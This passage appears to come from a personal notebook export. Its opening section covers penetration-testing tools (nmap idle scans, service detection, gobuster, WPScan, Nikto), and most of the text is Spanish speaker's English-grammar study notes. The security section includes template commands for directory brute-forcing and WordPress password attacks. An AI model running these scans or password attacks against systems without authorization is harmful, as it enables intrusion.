   → trigger the idle host to respond so that you can record the current IP ID on the idle host
   → send a SYN packet to a TCP port on target
   → trigger the idle machine again to response so that compare the new Ip ID with the one received earlier
- if port is closed response to zombie host
- if port is open response with SYN/ACK to zombie and this response with RST
- possible the target machine does not respond by firewall

Geting more details
- to get more info use --reason
- to know because namp concluded that the system is up or a particular port is open
- for more details use -v or -vv
- another mode is use -d or -dd to debugging details</rich_text>
      </node>
      <node name="Post port scans" unique_id="238" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704398126" ts_lastsave="1704405171">
        <rich_text>Service Detection
- before to detect open ports is necessary detect services 
- adding -sV collect and determine service and version information for the open ports
- is possible control the intensitity with --version-intensity LEVEL, ranges between 0 (lightest) and 9 or -sV --version-light has an intensity of 2 and -sV --version-all intensity of 9
- -sV use 3-way handshake and establish the connection, use of -sS is nos possible

OS Detection
- is possible detect the OS using -O
- nmap detect OS correctly the kernel version is possible was wrong
- this fails or is possible that is possible by virtualization

Traceroute
- find of routers between you and the target, only add --traceroute

NSE, nmap scripting engine
- scripts in Lua
- is possible use group of scripts
- can install other user's scripts
- run default scripts with: --script=default or adding -sC
- is used to validations, are very instrusives

Saving the output
- formats:
   → Normal
      ⇒ this is similar to the output in terminal
      ⇒ use -oN FILENAME
   → Grepable
      ⇒ use specific keywords or terms efficient
      ⇒ use -oG FILENAME
      ⇒ generally saved in 21 lines normal, in grepable is only 4 lines
   → XML
      ⇒ save in format XML
      ⇒ use -oX FILENAME
   → script Kiddie this is not recomend
      ⇒ like hacker numbers</rich_text>
      </node>
    </node>
    <node name="Web Enumeration" unique_id="241" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704850228" ts_lastsave="1705105101">
      <rich_text>Introduction
- vital in penetration testing

Manual enumeration
- use of browser developer console
- check comments in html code

Gobuster
- is written in go
- to install: sudo apt install gobuster

Modes:
- dir Mode: enumerate website directories, directory structure of a website, use of brute-forcing using wordlists
- using dir mode: gobuster dir, using -u and -w option: gobuster dir -u {url} -w {wordlist}
- this is common in capture the flag style room
- common use of -x and --extensions to search for the contents of directories 
- another use is .html, .php, .js and .css: gobuster dir -u {url} -w {wordlist} -x{.html,.css,.js}
- The -k flag, has important use during penetration test and cpture the flag event, used with unvalid certification and continue scanning, is used with dir and vhost modes
- dns Mode: brute force subdomains, same in penetration testing or capture the flag it is important check subdomains, is possible that in some subdomains exists a hole
- to use: gobuster dns -d {domain} -w {wordlist}
- vhost mode, brute force to virtual hosts
- using: gobuster vhost -u {host} -w {wordlist}

WPScan
- enumerating and researching a few security vulnerability categories present in wordpress sites:
   → sensitive information disclosure
   → path discovery
   → weak password policies
   → presence of default installation
   → testing web application firewalls
- use information within a local database as a primary reference point
- is recommended update this database before performing any scan

Modes:
- enumerating for installed themes
   → with network tab is possible check this istalled data
   → check with: wpscan --url {url} --enumerate t
- installed plugins
   → discovery listing, this is like ls in linux
   → is possible enumerate plugins in the page
   → check with: wpscan --url {url} --enumerate p
- users:
   → is possible use brute-forcing attacks
   → with: wpscan --url {url} --enumerate u
- vulnerable flag
   → is possible see MITRE, NVD and CVEDetails in the name of plugins
   → using option -v: wpscan --url {url} --enumerate vp
- performing password attack
   → using: wpscan --url {url} --password {txt file} --usernames {username}
- adjust WPScan's aggressiveness (WAF)
   → try t be least “noisy” as possible, 
   → usng --plugin-detection and a aggressiveness profile (passive/aggressive) for example: --plugin-detention aggressive

Nikto
- released in 2001, popular vulnerability scanner, opensource and feature-rich
- used for multiple types of webservers
- discover:
   → sensitive files
   → outdated servers and programs
   → common server and software missconfigurations

Modes:
- Basic scanning, use of flag -h and ip address or domain name: nikto -h {vulnerable_ip}
- multiple hosts and ports, is possible provide multiple arguments in a way: nikto -h {ip} -p {list ports}
- Plugins, specify plugins: nikto -h {ip} -Plugin {plugin}
- increase the verbosing: use -Display
- is possible tuning the scan using -Tuning with multiple categories
- saving findings:
   → multiple formats output: text file and html report
   → use of -o or -Output, specify the format with name file or using -f flag</rich_text>
    </node>
  </node>
  <node name="English" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1624747640" ts_lastsave="1685941303">
    <node name="Descriptions" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1624747655" ts_lastsave="1625432347">
      <rich_text>Discovery learning
	fill in the gaps
	Guessing
	Match columns
	Organize words
complete sentences
play games
use pen and paper
play and pause is very important
interactive discution panel (Q&amp;A)
uses of like
places
weather
peaple
character and personality
describe pictures
using descriptive language to compare

What is it like? (como es, description, forma de ser) != what does your best friend like? (comments, interests)
what does your best friend like? (comments, interests)
Intelligent, friendly, 
what does you best friend look like? (description of physical aparience)
############
1-b
2-a
3-d
4-c
############
Class 2 ex 2
1-d
2-c
3-b
4-a
############

# The weather
good, great, nice, fine, lovely, beautiful, wonderful, excellent, gorgeous, fair, pleasant, balmy;
bad, awful, terrible, nasty, lousy, foul, rotten, miserable, unpleasant, dull, gloomy, ugly;
sunny, warm, hot, mild, cool, chilly, cold, freezing, icy, frosty; very cold; bitter cold;
rainy, wet, humid, dry, arid, frigid, foggy, windy, stormy, breezy, windless, calm, still;
a spell of good weather; a two-day spell of sunny weather; a spell of rainy weather;
Sky: cloudy, overcast, cloudless, clear, bright, blue, gray (BrE grey), dark; a patch of blue sky.

rainy - lluvioso
foogy - niebla
cloudy - cielo nublado
warm - caluroso

class 3 ex 1
caluroso
1-warm
2-boiling
3-mild
4-
frio
1-cool
2-freezing
3-chilly
4-icy
--
1-windy
2-breezy
3-cool
4-icy

places:
bright
dark
big
small
Noise - ruidoso
Quiet - silencioso

more advance
crowded: (of a space) full of people, leaving little or no room for movement; packed
expensive
famous
fascinating
lively - full of life and energy; active and outgoing
spectacular

ancient
boring
charming - special place
exciting
dangerous
awesomw

Describir el clima de la ciudad
Describir tu hogar

</rich_text>
    </node>
    <node name="reto" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1627231811" ts_lastsave="1627232346">
      <rich_text>What is your favorite place? Describe it below in the comments!
In this moment my favorite place is my house, especially my “office”, it is a special room in my house where I have my computer, my controls, my chair, one large desktop in L and other things. It is a medium room, whit 3 windows, one door, it very bright and quiet, the weather is little warm, this is caused by the computer when is worked.



bright
dark
big
small
Noise - ruidoso
Quiet - silencioso</rich_text>
    </node>
    <node name="reto" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1627536290" ts_lastsave="1627539650">
      <rich_text>• Wake up (Despertarse)
• Get up (Levantarse)
• Take a shower ( tomar una ducha)
• Check email (Revisar email)
• Have breakfast (Desayunar)
• Go to work ( ir al trabajo)
• Have lunch (Almorzar)
• Have coffee (Tomar un cafe)
• Drive ( Conducir)
• Have dinner (Cenar)
• Watch TV (Mirar Television)
• Chat (Platicar o charlar)
• Go to bed ( ir a la cama)
• Sleep (dormir)

describe daily routine
I wake up at 7:30 am, I get up at 8:00 am, I have breakfast at 9:00 am, usually I study from 8:00 am to 10:30 am, I take a meet at 10:30 am, I have lunch at 11:00 am, I work from 12:00 pm to 6:00 pm and from 6:00 pm to 7:00 pm I study basic courses of programming or I review some themes of libraries, I have another lunch at 5:00pm, I take shower at 7:00 pm, I have dinner at 9:00 pm and I go to bed at 12:00 am

describe family
We are three in my family, my son, my wife and I, my son is a little boy, his name is Leo, he has various play doh of color blue, green, yellow and white, my wife is student of gastronomy, her name is Stephani, I'm engineer, I'm work in my house and I have one computer of color grey</rich_text>
    </node>
    <node name="metas" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1629764315" ts_lastsave="1669772397">
      <rich_text>asimilar 10 palabras
anotar palabras nuevas
asimilar dos frases diarias
pensar 10 minutos en ingles
aplicar lecturas en ingles



Italy

incremented
internet



Denmark

devolve -&gt; devolved
disk</rich_text>
    </node>
    <node name="JJ" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1631657919" ts_lastsave="1649720295">
      <rich_text>
In the morning
In the afternoon
In the evening
at night

In, On &amp; At
 I go to the park ON saturday AT ten IN THE MORNING
 I go to school ON monday AT nine IN THE MORNING
 
introducing yourself
"(Greeting)!
My name is  (Your name) .
My last name is spelled  (spell your last name) .
I am _____ years old. I am from (your country)
(Farewell)!"

how are you?

See you later, take care

bakery
hospital
airport
school
pharmacy

Prepositions of place
	- on - arriba
	- between - entre
	- behind - detras
	- in front of - delante de
	- next to - al lado de

What do you like? (hobbies)
- I like to ...
- in dislike use I don't like

Adverbs of frecuenct
- never - 0%
- rarely - 5%
- seldom - 10%
- occasionally - 30%
- sometimes - 50%
- often - 70%
- frequenly - 80%
- usually - 90%
- alway - 100%
- Noun + frequency + action, ex: I never drink coffe
- Exception: Sometimes I go to the beach
- hardly ever, casi nunca

tarea
- numeros
- spell de palabras que nos aventamos

----------------------------------------------------------------------------------
---
----------------------------------------------------------------------------------
Can you speak slowly please? *
Can you repeat please? *
nice to meet you * to *
It's a plaesure to meet you

I'm well | great | fine | sad | sad

how old are you?
How do you spell that?
I´m twenty-eight years old. I´m 28.

what do you do?
this, cerca (mio)
that, lejos (no mio)
theese, cerca (mio)
those, lejos (no mio)

I
You
We
They
He
She
It

My
your
his
her
Its
Their
Our


# When is your birthday?
- my birthday is in June
- my birthday is on June 21st

formats of dates is
- most countries: dd/mm/yyyy
- USA mm/dd/yy

Telling time
- o' clock
- quarter past
- prepositions past between 0 and half
- prepositions to between half and 0
- it's five past four
- it's quarter past four
- it's half past four
- it's twnety-five to five
- it's quarter to five
- it's five o'clock
- se usa para para cuartos de horas, para los pasados, para numero mas puntuales, it's nine four, it's nine ‘ou’ four

What time is your country?

Which - Cuál -option
Who - Quién
What - Qué -- tjhis is more general
When - Cuándo 
Where - Dónde -- 
Why - Por qué -- reason
How - Cómo
	old
	far
	long
	many -- quantities
	much -- cost of something
	
Prepositions
- beside
- behind
- under
- over

- in - more general use with countries/cities
- on - use with streets/avenues
- at - is more especific, fro example addresses

# Wants and Wishes
- i would like -&gt; i'd like, more formal
- I want, is more direct as boss be careful

# have or have got
- is very similar
- have, I have a car
- have got, is very more informal, I've got a car
- use with Illnesses
- for third person or it is used with has, for another is used have
- is used with do and does with question and negatives

# Can vs Can't
- is used to:
   → Ability
   → Permission
   → Requests
   → Possibility
- POSSESSION ('s)
   → when the word ends with s ex: *the dogs' plates are full* or *James's office is spacious*, the pronuntiotion is necesary
   → when exists two sustantives and only one 's the possession is of both
   → when exists more 's each one has a one personal possession
- there is and there are
   → something exists or not exists
   → there is for singular or incontable nouns
   → there are for plural
- subject and object pronouns
   → subjects as I, you, he, she..., used with person animal or thing that does the action
   → objects as me, you, her, it...., receives the action
- Likes dislikes and opinios
   → express feelings
      ⇒ like, love, enjoy to likes
      ⇒ don't like, hate, dislike to dislikes
      ⇒ think, consider or believe to express opinion
- present simple vs present continuos
   → things that are always true (present simple) or habits or repeated actions
   → action happening at the momento of speaking, use verb to be + ing

boot
but
bot
both

four aspects:
- Name
- Nationality
- Job/Occupation
- Age

Hi!, My name is Pedro, I'm Mexician, I'm SysAdmin, I'm 33 years old

introducing others:
- use of this: this is my friend Ana
- with multiple people is used these are

Simple present:
- two options:
   → Verb to be
      ⇒ caracteristics of people (am, is are), details
   → other verbs
      ⇒ use ‘s’, ‘es’, ‘ies (when ends with y)’ when is the third person
      ⇒ use of do in negative and questions

# Wh questions
- who - people
- where - places
- when - times
- what - things
- why - reasons
- which - options

Places:
- in - dentro
- on - sobre
- in front of - en frente de
- next to - al lado
- behind - detras
- under - debajo
- over - sobre

# have or has
- deppending of pronoun, (irregular verb), with thid persons is used has, with negative and question form is used have, changing only do -&gt; does

Irregular plural nouns
- book -&gt; books
- apple -&gt; apples
- man -&gt; men
- life -&gt; lives
- foot -&gt; feet
- hero -&gt; heroes
- child -&gt; children
- fish -&gt; fish  ?_?
- knife -&gt; knives

Imperative form
- use to: instructions, order or advices

And vs but:
- and, similar ideas
- but, show contrast

A vs An:
- this is similar, but the use is depending of first sound of new word

I got late -&gt; llegue tarde

may - permission not can
restroom =&gt; caoque tenga WC, bathroom =&gt; cuanto tiene regadera, bedroom =&gt; habitacion

as, like -&gt; check differences

# Descriptions and comparatives
What is it like?
- what is your best friend like? - this is for descriptions, this is a description in personality
- what does your best friend like? - this for likes as food or music, interest
- what does you best friend look like? - this for phisical aparience
- what is your bedroom like? - this is used with profesions and places

The weather

yesterdar, I was only documenting regarding this point, checar los “ando endo” del ingles
I'm Swiss knife
I am sleepy
verify to check
generate

-- new words to use with reflexive pronouns
- blame, culpar
- cur, cortar
- enjoy, disfrutar
- help, ayudar
- hurt, lastimar
- introduce, presentarse
- prepare, preparar
- teach, enseñar

this is possible change the mean of verb: Help </rich_text>
      <rich_text weight="heavy">yourself</rich_text>
      <rich_text> to some coffee.(Sírvete un café tú mismo.)

preposition of time
- at is used for a specific time
- exception:
   → at night, I go to sleep
   → at christmas, we eat a lot of food (for holydays)

Use of ing
- I like|love|hate + verb+ing

expressing intentions
- I want to + verb (intention)
   → I want to swim
- I don't want to... (negative)

How far, long and often?
- long for duration of time
- far is for distance (kilometers)
- often is for frequency (every 15 mins)

Common past verbs
- eat  -- ate
- give   -- gave
- write  -- wrote
- go  -- went
- see  -- saw
- feel  -- felt
- make  -- made
- do  -- did
- drink  -- drank
- know  -- knew
- fly  -- flew
- Another
   → put, cut, read and hit
- To be, feeling states and physical places:
   → was, i she and he
   → were, we they and you

Did and Didn't
- is an auxiliar verb in past, negatives and questions

Preposition
- in - dentro
- on - sobre de algo
- above - encima algo
- between - entre
- under (belove)- abajo
- next to - al lado
- near - cerca

- past = after
- to = before

Wh question:
- what, asking about things or information
- where, location or place
- why, reason of something
- when, for time
- which, two options or objects
- who. a person o people

# A2 - preguntas y respuestas
- Determiners singular and plural:
   → this, is for singular and close distances
   → that, is for singular and far distances
   → these, plural and near
   → those, plural and far
- Present continuos
   → at the moment
   → subject + verb-be = verb(ing)
- Contables an uncountables
   → contables
      ⇒ 
   → uncontables
      ⇒ sugar
      ⇒ beer
      ⇒ food
      ⇒ money
      ⇒ time
      ⇒ fruit
   → quantifiers
      ⇒ any: questions and negative
      ⇒ some: affirmative
- how much and how many:
   → much:
      ⇒ for uncontable nouns
      ⇒ price of something
      ⇒ with singular and plural nouns
   → many:
      ⇒ contable nouns
      ⇒ quantity of something
      ⇒ only with plural nouns
- At as preposition of time
   → for specific time
      ⇒ used with at night:
         • at night, i go to sleep
         • at christmas, we eat a lot of food
- references using ing
   → used with like, love and hate + verb-ing
   → or used with like, love and hate + to + verb (without ing)
- Expressing intentions
   → I want to + verb (intention)
      ⇒ I want to swim
      ⇒ I wanto to eat pizza
   → Negative: I don't want to...
- How long, far and often
   → How long
      ⇒ use for duration or time 
   → How far
      ⇒ is use for distances
   → How often
      ⇒ is for frequency
- especial words: “lift-and-shift”, “lift, tinker, and shift,”
- past verbs include was and were
   →  Eat, ate
   → give, gave
   → write, wrote
   → go, went
   → see, saw
   → feel, felt
   → make, made
   → do, did
   → drink, drank
   → know, knew
   → fly, flew
   → other interesting
      ⇒ put, cut, read and hit
      ⇒ was: I, she and he, it
      ⇒ were: we, they and you
- do and did
   → is an auxiliar verb, in negative form is necesary
   → with positive is posible use “I did go to the park” or “I went to the park”
- with possessives “estructure”: that|those is|are {person}'s {object}
- Preposition of place
   → In, dentro
   → on, sobre algo
   → above, encima de algo
   → between, entre
   → under o below, bajo
   → next to, al lado de, de formar cercana
   → near, al lado de de forma lejana
- Past == after
- to == before
- Wh questions:
   → What, asking about things or information
   → where, location or place
   → why, reason for something
   → when, for time
   → which, two options or objects
   → who, a person or people

Which question is correct?
Did you finish your homework?


# Basic connectors
- connects ideas
- and, is used by addition
- but, is used to contrast
- or, is used for multiple options

# Articles
- the, refer to specific, people, things or situations
   → specific people:
      ⇒ only one or unique person
      ⇒ particular person
      ⇒ groups of people
      ⇒ families
   → things:
      ⇒ musical instruments
      ⇒ only one in the place
      ⇒ particular place
      ⇒ famouse monuments, builds, museums
      ⇒ hotels, bars and restaurants
      ⇒ unique things
   → situations
   → ordinal numbers
   → decades
   → geografical areas
   → countries (plural names, republic, kingdom, states)
- Not use:
   → name of cities or countries
   → years
   → professions
   → people's names and titles combined wirh names
   → meals
   → languages

kick boxing
korn flakes

kill
killed
laidback - relajado

blue
megaman
switch
share button
sad
innocence
sky


park
cat
plump
father in law
cook
sister
pizza

I can dance, I can play guitar, I can sing


--------
</rich_text>
    </node>
    <node name="estrategias" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649291591" ts_lastsave="1649448348">
      <rich_text>Evaluar las competencias es importante porque:
Son factores que determinan la importancia de las estrategias de estudio en el proceso de aprendizaje:

</rich_text>
    </node>
    <node name="hours and requests" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649720590" ts_lastsave="1649805908">
      <rich_text>Basic connectors
- And, addition
- but, contrast, one option but another no
- or, options, use one or another

The, article
- people, only one person or particle (unique), group of people, families
- things, musical instruments, only one in the place, particular place, monuments, buildings, museums, hotels, bars, restaurants, unique things
- situations, ordinal numbers, decades, geographical areas, countries
- not use, name of cities and contries, years, professions, people's names and titles combined with names, meals, languages</rich_text>
    </node>
    <node name="Basi A1" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656369145" ts_lastsave="1656619420">
      <rich_text>Introduction
- Who am I?
- Interesting facts
- in english alphabet has 26 letters
- A and An
   → refer to only this or noun
   → an is used as article with vowels
   → a is used with consonants
- It's sentences (it is)
   → it's + article (a/and) + (person, place, thing or item)
- Plural forms
   → mean many things
- there are
   → this is a plural form
   → there are + plural noun

Second module
- is very important from 1 to 20
- 100 - one hundred
- subject pronouns
   → I am
   → he/she/it is
   → they/we/you are

good morning
good afternoon
good evening</rich_text>
    </node>
    <node name="describing my house" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656878011" ts_lastsave="1656984966">
      <rich_text>Home Sweet home
- Was, this ‘era’, be past, singular
- Were, plural of be past
- I didn't do that, irregualr verbs to past
   → only is used when is negative or question
- like doing, liked doing
- love doing, loving “playing” - verb in ing
- hate doing, hated

Describe my child home
things that I did in my child home and I didn't
Actions that I like, love or hate doing

What are we doing here?
- this is in the moment
- verbs with be + verb(ing)
- right on time:
   → present simple
   → present continues
   → at - for time
- count on me
   → how many, contable nouns
   → how much, uncontable nouns
- we have com this far
   → How long, time to execute a task
   → how often, time between tasks
   → how far, distance
- things in my house
   → prepositions:
      ⇒ on
      ⇒ in
      ⇒ next to
      ⇒ in front of
      ⇒ behind

My dream house
- whose things are those in your dream house?
- use of whose, de quien es
- linking verbs
   → how to describe your dream house, using adjectives</rich_text>
    </node>
    <node name="Articles and modal verbs" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1657152267" ts_lastsave="1663367835">
      <rich_text>Basic connectors:
- connects two ideas
- And, is for additions
- But, contrast
- or, show options

article THE
- refer to specific
   → people
      ⇒ only one person
      ⇒ particular person
      ⇒ groups of people
      ⇒ families
   → things
      ⇒ musical instruments
      ⇒ only one in the place
      ⇒ particular place
      ⇒ famous monuments, buildings, museums, etc
      ⇒ hotels, bars and restaurant
      ⇒ unique things
   → situations
      ⇒ ordinal numbers
      ⇒ decades
      ⇒ gegraphical areas, groups of rivers, mountains ranges, oseans
      ⇒ Countries, plural names
- not use:
   → name of cities and countries
   → years
   → professions
   → people`s names and titles combined with names
   → meals
   → languages

Weather coonditions
- it's
   → it's + condition (inpersonal subject)
   → use with distance or time
   → ex
      ⇒ It's sunny
      ⇒ it's cloudy
      ⇒ it's rainy
      ⇒ it's windy

Not Here/There
- adverbs of place
   → here, speaker point of view
   → there, listener point of view

Frequency
- forming question
   → how often + do/does + subject + verb?
- Adverbs of frequency
   → - never - 0%
   → rarely - 5%, hardly ever
   → seldom - 10%
   → occasionally - 30%
   → sometimes - 50%
   → often - 70%
   → frequenly - 80%
   → usually - 90%
   → alway - 100%
- frequency
   → time expresions
   → adverb of frequency
      ⇒ before the main verb
      ⇒ after the verb be

Permission
- Can and Can't, permissions and denied permission
   → ask, structure Can + subject + action?
   → give, subject + can + action
   → deny, subject + can't + action
- Offer, Request, suggestion
   → is possible use can to offers, ex: Can I help you?
   → request: can we finish this tomorrow?
   → suggestions: can you tell her you're sorry?
- decline offers and invitations
   → use can't
      ⇒ thanks, but I can't have any sugar
   → invites:
      ⇒ Sorry. We can't be there tomorrow

Making requests
- would like
   → is used to offer or requests:
      ⇒ offer, Would you like some coffee?
      ⇒ requests: I would like a beer, please, contraction: I'd like a beer
- Could
   → is used to making requests
      ⇒ is more polite, is more formal
      ⇒ could we finish this tomorrow?

Time
- What time is it?
   → learn the time in english
   → past, present, future
   → numbers: It's seven o'clock
   → past/to: it's ten to two
   → divide the clock in two parts, from 0 to 6 is past/after minutes (word) hour, and 6 to 12 is “to” minutes left to next hour
   → a quarter in 15 and 45, half in 30
   → it's four oh five
   → it's a quarter past six
   → it's half past two
   → it's a quartet to twelve
- time expressions
   → past, yesterday, last
   → present, today, 
   → future, tomorrow, later, next, this
- prepossitions
   → at, used in precise time, hours, dates for example holydays, mealtimes, specific times ex: at bedtime
   → on, days and dates, , on april x or on saturday, parts of specific days, special dates ex: on my birthday

How to do things
- how to create, execute things
- ex:
   → how do you open this?
   → how do you say that in spanish?
   → how do you spell your name?</rich_text>
    </node>
    <node name="elementos y expresiones de trabajo" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664132487" ts_lastsave="1664132487"/>
    <node name="miembros de la familia" unique_id="118" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1665440693" ts_lastsave="1684372228">
      <rich_text>family members
- close family
   → mother
   → father
   → sister, brother or siblings
- extend family
   → grandmother
   → grandfather
   → aunts and uncles
   → cousins
   → niece or nephew, (sobrinos)
- in laws
   → family members of husbando or wife

Nice to meet you
- this is a monologue of me
- My name, my age, what I am, what is my profession, my hobbies, what I love, my favorite food

Description of family members
- family members
   → close family
      ⇒ mother
      ⇒ father
      ⇒ sister, brother or siblings
   → extended family
      ⇒ grandmother, mathernal o pathernal
      ⇒ grandfather, “      ”
      ⇒ aints and uncles, brother or sisters of father or mother
      ⇒ cousins, primos
      ⇒ nephew, sobrinos
   → in laws
      ⇒ housband or wife family
      ⇒ mother and father  in law
      ⇒ sister or brother in law
- presentation
   → my name is, years old, I'm student, profesion, hobbies, favorite things, favorite food

Describing people and routines
- who are they?
- physical characteristics
- how to looks
- look like?
- write 5 sentences to describe member of my family
- my daily routine
   → i wake up at {hour}
   → I take a shower and get dressed
   → I have breakfast at {hour} I usually eat a sandwich and drink coffee
   → I brush my teeth and leave my house, so I can go to {destination}
   → I have lunch at {hour}
   → then I get ready to practice guitar after classes
   → before I go home, I like to spend time with my friends
   → We sometimes go for a walk aroung the university campus or maybe get something to eat
   → after that, I go home at {hour}, I rarely clean the entire house, but I help my parents to take out the trash
   → I also take turns to take tje dog for a walk in the evenings
   → I do my homework and surf the internet before I go to bed
   → I listen to music and relax right before I sleep
   → </rich_text>
      <rich_text weight="heavy">write 8 actions of your daily routine</rich_text>
      <rich_text>
   → </rich_text>
      <rich_text weight="heavy">Create a list of 8 actions of the daily routine of a family member</rich_text>
      <rich_text>

Irregular Plurals
- one or many
- one man or many men
- several Mice, muchos ratones
- prepositions
   → where is it?
   → above, arriba
   → next to, al lado
   → between, entre
   → on, sobre algo
   → behind, detras
   → in front of, delante de algo
   → to the left, al lado izquierdo
   → </rich_text>
      <rich_text weight="heavy">Write 5 sentences to practice</rich_text>
      <rich_text>
- members of family
   → who is that
   → guess who - the daughter of my mother is, my sister
   → niece, sobrina
   → my nephew, sobrino
   → my son 
- what's that and where is it
   → que es eso?, what is that? It is an apple
   → who is that?, quien es?, she is a woman
   → what are those?, que son esos?, those are fish
   → where is the woman?, donde esta la mujer

Household chores
- my mom says... {to person}
   → sweep the kitchen
   → vacuum the living room
   → do the dishes
   → walk the dog
   → mow the lawn
   → take the trash out
   → make the bed
   → </rich_text>
      <rich_text weight="heavy">write 7 imperative sentences</rich_text>
      <rich_text>
- activities of birthday
- writing exercise
   → have -&gt; has
   → is, does not work, looks takes
   → is, works, likes, loves
   → is, works, loves
   → live, is, does not have
   → lives, visit, have, do not like

ERRORES:
What adjectives can we use to describe </rich_text>
      <rich_text weight="heavy">physical characteristics</rich_text>
      <rich_text>?
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">Which of these phrases </rich_text>
      <rich_text weight="heavy">belong to an afternoon routine</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">?</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3" foreground="#eff3f8">Which of these sentences is </rich_text>
      <rich_text weight="heavy">NOT</rich_text>
      <rich_text scale="h3" foreground="#eff3f8"> correct?</rich_text>
    </node>
    <node name="Question and answer" unique_id="145" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684541659" ts_lastsave="1685304994">
      <rich_text>What are your likes and dislikes?
- like, love and hate
- Like, some things that is positive
- Love, emotions is stronged
- Hate, things that I don't like
- use:
   → I like + (verb)-ing
   → I love + (verb)-ing
   → I hate + (verb)-ing
- he/she/it, likes|loves|hates

What are your hobbies?
- linking word and
   → to link similar ideas, thoughts and actions
- I like exercising and going out with my friends

What was your childhood like?
- Irregular and regular verbs
- irregular
   → change complete, when use in past
   → eat, Ate
   → drink, drank
   → sing, sang
   → become, became
   → choose, chose
   → do, did
   → feel, felt
   → give, gave
   → have, had
   → in third person doesn't add s
- was/were - irregular verb of “to be”
   → I was at a concert yesterday
   → I was
   → he, she, it -&gt; was
   → you, we. they -&gt; were
   → in negative use wasn't and weren't
- regular verbs, ends in ed
   → walk, walked
   → play, played
   → call, called
   → accept, accepted
   → bake, baked
   → change, changed
   → decide, decided
   → imagine, imagined
   → talk, talked

Where do you live
- locations or placements, prepositions of place
   → on, sobre tocando
   → in
   → above, arriba sin tocar
   → below, abajo sin tocar
   → over, toma todo el espacio, arriba
   → under, todo el espacio, pero abajo
   → in front of, adelante del objeto
   → across from, se usa mas para cuando se tiene que cruzar la calle
   → behind, detras de
   → between
   → next to, al lado de
   → to the left of
   → to the right of

Who is that?
- how to use 's, to express
   → something or someone belongs toa person
   → is coneected to a place
   → to show the relationship between people
   → s', use with regular pluran nouns
      ⇒ ex: My brothers

What is your family like?
- use of present continous
   → my siblings like playing together
   → use of verbs with s in third person (likes)

What is your style
- her style appears colorful
- she looks beautiful
- her accessories are cut
- linking verbs, connect the subject of a sentence to an adjective, noun or pronoun:
   → </rich_text>
      <rich_text weight="heavy">looks</rich_text>
      <rich_text>
   → </rich_text>
      <rich_text weight="heavy">appears</rich_text>
      <rich_text>
   → verb to be in all forms
   → became
   → seem
   → appear
   → get
   → feel
   → sound
   → taste
   → look
- his clothes look casual

What do you have in your closet?
- order of adjectives
   → beautiful, opinion
   → small, size
   → sharp, physical quality
   → square, shape
   → young, age
   → blue, color
   → brazilian, origin
   → wool, material

What are you wearing to the party?
- this and these
   → this, something that is close to the speaker
   → these, sme things that are close to the speaker
- that and those
   → that, something that is away from the speaker
   → those, some things that are away from the speaker

What is your day like?
- let's talk about my day
- I wake up at 6:00, </rich_text>
      <rich_text weight="heavy">at is for specific time</rich_text>
      <rich_text>
- After I get up, I make my bed
- questions:
   → What time do you wake up?
   → What do you do after you wake up?
   → What time do you have breakfast
   → What other activities do you do?

What time is it?
- 4 key expresion
   → o'clock, en punto
   → quarter past, a los 15 minutos
   → half past, a la media hora, half past nine
   → quarter to, quarter to ten
   → past is used before 30
   → to is used after 30

Who, what, where
- formula questions about the past
   → wh + did + person + verb + complement?
   → who did you go with?
   → what did you do last weekend?
   → where did you go?
   → why did you go to that place?

How often, how far, how long?
- places in the city
- how often
   → we use it to express the frequency of an action
   → how often do you go to the gym?
   → use of adverbs of frequency
- how far
   → we use it to express distance
   → how far is the bank
   → use of measureaments
- how long
   → we use it express length, duration of an action
   → how long does it take you to get to work?

What is on your shopping list?
- what do you want to include?
   → I want to buy cheese and bread
   → I want to get fresh produce
- Countable nouns
   → egg(s)
   → cookie(s)
   → apple(s)
- Uncountable nouns and quantifiers
   → milk
   → bread
   → cheese
   → meat

How much, how many?
- how much
   → refer to uncountable things
   → how much bread do you want to buy?
      ⇒ one loaf
   → use of price of something
      ⇒ how much is the bread?
- how many
   → to refer ro countable things
   → how many cookies would you like?</rich_text>
    </node>
